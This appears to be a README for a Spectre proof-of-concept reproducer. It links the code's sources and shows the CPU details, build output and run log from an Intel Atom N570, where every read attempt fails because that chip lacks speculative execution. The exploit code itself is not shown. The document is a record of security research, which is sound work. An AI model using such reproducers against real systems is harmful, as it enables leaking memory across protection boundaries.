# Reproducer for Spectre

The source code comes from:

* https://pastebin.com/raw/R48nqKqg
* https://repl.it/repls/DeliriousGreenOxpecker
* https://www.abclinuxu.cz/blog/programy/2018/1/spectre-na-amd

## Execution on Intel Atom N5xx (Pineview)

First block from `/proc/cpuinfo`:

```
processor       : 0
vendor_id       : GenuineIntel
cpu family      : 6
model           : 28
model name      : Intel(R) Atom(TM) CPU N570   @ 1.66GHz
stepping        : 10
microcode       : 0x107
cpu MHz         : 1334.000
cache size      : 512 KB
physical id     : 0
siblings        : 4
core id         : 0
cpu cores       : 2
apicid          : 0
initial apicid  : 0
fpu             : yes
fpu_exception   : yes
cpuid level     : 10
wp              : yes
flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov
pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm
constant_tsc arch_perfmon pebs bts nopl cpuid aperfmperf pni dtes64 monitor
ds_cpl vmx est tm2 ssse3 cx16 xtpr pdcm movbe lahf_lm tpr_shadow vnmi
flexpriority dtherm
bugs            :
bogomips        : 3324.95
clflush size    : 64
cache_alignment : 64
address sizes   : 36 bits physical, 48 bits virtual
power management:
```

The reproducer doesn't work (as expected, since this cpu doesn't have
instruction reordering, speculative execution, nor register renaming):

```
$ make
gcc -march=native -std=c99 -O0 spectre.c -o spectre
spectre.c: In function ‘main’:
spectre.c:136:51: warning: pointer/integer type mismatch in conditional
expression
       (value[0] > 31 && value[0] < 127 ? value[0] : "?"), score[0]);

$ ./spectre
Reading 40 bytes:
Reading at malicious_x = 0xffffffffffdffad0... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffad1... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffad2... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffad3... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffad4... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffad5... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffad6... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffad7... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffad8... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffad9... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffada... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffadb... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffadc... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffadd... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffade... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffadf... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffae0... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffae1... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffae2... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffae3... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffae4... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffae5... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffae6... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffae7... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffae8... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffae9... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffaea... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffaeb... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffaec... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffaed... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffaee... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffaef... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffaf0... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffaf1... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffaf2... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffaf3... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffaf4... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffaf5... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffaf6... Success: 0xFF=’ score=0
Reading at malicious_x = 0xffffffffffdffaf7... Success: 0xFF=’ score=0
```
